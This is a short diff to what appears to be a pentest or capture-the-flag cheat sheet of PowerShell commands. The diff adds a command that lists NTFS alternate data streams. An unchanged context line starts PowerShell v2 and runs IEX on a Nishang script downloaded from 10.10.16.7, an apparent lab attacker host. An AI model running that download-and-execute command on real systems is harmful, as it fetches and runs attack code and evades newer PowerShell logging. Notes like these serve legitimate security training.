@@ -50,3 +50,6 @@
 
 # Jump to powershell v2
 `Start-Process Powershell.exe -ArgumentList "-v 2 -c IEX(New-Object Net.webClient).downloadString('http://10.10.16.7/nishang.ps1')"`
+
+# Get Alternate Data Streams
+`$ErrorActionPreference = 'SilentlyContinue'; ls * -Recurse -Force | % {Get-Item $_ -Stream * | ? {$_.Stream -notmatch ':\$DATA|Zone\.Identifier'} |Select FileName, Stream}; $ErrorActionPreference = 'Continue'`
